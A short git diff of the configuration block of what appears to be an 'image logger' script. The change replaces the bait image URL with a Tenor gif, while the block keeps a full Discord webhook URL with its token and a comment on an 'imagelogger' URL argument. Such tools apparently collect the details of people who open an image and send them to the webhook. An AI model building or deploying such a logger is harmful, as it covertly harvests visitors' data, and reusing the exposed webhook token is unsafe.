@@ -12,7 +12,7 @@ __author__ = "Yurii"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1399934682858258443/WbLMGdPiZa3_qqBPTJOObQ_I2jIYRSRGLzeiY3BFKf0v4aslNtnxuSuQgjLvI2KQdgwN",
-    "image": "https://cdn.discordapp.com/attachments/1169335083979780146/1173310286388789268/dont-middle-click-this-gif.png?ex=65637d5b&is=6551085b&hm=312a90285767f3d3c2b0e8741193fba1b6b8e168f793ca49da3886eb0965fbc3&", # You can also have a custom image by using a URL argument
+    "image": "https://media1.tenor.com/m/T-CnKRVP2hgAAAAC/dont-middle-click-this-gif.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
